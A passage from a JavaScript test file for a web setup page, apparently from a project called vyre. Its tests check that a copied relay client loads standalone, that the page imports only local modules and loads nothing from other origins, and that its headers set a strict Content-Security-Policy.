  focus() {}
  all() { return this.children.flatMap(c => c instanceof FakeEl ? [c, ...c.all()] : []); }
  get textContent() { return this.children.map(c => (c instanceof FakeEl ? c.textContent : c.value)).join(" "); }
  set innerHTML(_) { this.doc.innerHtmlWrites++; }
  set textContent(v) { this.children = [{ value: String(v) }]; }
}
class FakeDoc {
  constructor() { this.innerHtmlWrites = 0; }
  createElement(tag) { return new FakeEl(tag, this); }
  createTextNode(value) { return { value }; }
}
void h;

test("site: the relay client copied the way build-site.sh does it loads on its own, with no import from outside its folder", async t => {
  const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path"), url = await import("node:url");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-site-"));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const src = path.join(path.dirname(url.fileURLToPath(import.meta.url)), "..", "..", "relay", "client");
  fs.mkdirSync(path.join(dir, "relay"));
  for (const f of fs.readdirSync(src)) if (f.endsWith(".js") && !f.endsWith(".test.js")) fs.copyFileSync(path.join(src, f), path.join(dir, "relay", f));
  fs.writeFileSync(path.join(dir, "package.json"), '{"type":"module"}');
  const m = await import(url.pathToFileURL(path.join(dir, "relay", "setup.js")).href);
  for (const name of ["createSetupKey", "setupCode", "resolveSetup", "setupWords", "mailboxReader"]) assert.equal(typeof m[name], "function", name);
  // and the page's own files import nothing at all except the client (page.js) and each other
  const page = fs.readFileSync(path.join(path.dirname(url.fileURLToPath(import.meta.url)), "page.js"), "utf8");
  assert.deepEqual([...page.matchAll(/^import .* from "([^"]+)"/gm)].map(x => x[1]).sort(), ["./box.js", "./deck/js/phone-code.js", "./flow.js", "./relay/bytes.js", "./relay/client.js", "./relay/setup.js", "./relay/webcrypto.js", "./ui.js"]);
});

test("site: the setup page loads nothing from another origin, and its headers say so", async () => {
  const fs = await import("node:fs"), path = await import("node:path"), url = await import("node:url");
  const here = path.dirname(url.fileURLToPath(import.meta.url));
  const html = fs.readFileSync(path.join(here, "index.html"), "utf8");
  const css = fs.readFileSync(path.join(here, "setup.css"), "utf8");
  for (const [name, text] of [["index.html", html], ["setup.css", css]]) assert.ok(!/https?:\/\/(?!vyre\.run)/.test(text.replace(/<link rel="icon"[^>]*>/, "")), `${name} names no other origin`);
  assert.ok(!/inline|<script>(?!<)/.test(html.replace(/<script type="module" src="[^"]+"><\/script>/, "")), "no inline script");
  const headers = fs.readFileSync(path.join(here, "..", "_headers"), "utf8");
  for (const want of ["default-src 'none'", "script-src 'self'", "style-src 'self'", "font-src 'self'", "object-src 'none'", "worker-src 'none'", "Cross-Origin-Opener-Policy: same-origin", "Permissions-Policy: camera=(), microphone=(), geolocation=(), clipboard-read=()"]) assert.ok(headers.includes(want), want);
  assert.ok(!headers.includes("googleapis") && !headers.includes("gstatic"));
  assert.match(headers, /^\/setup\n/m, "the redirect from /setup carries the headers too");
});
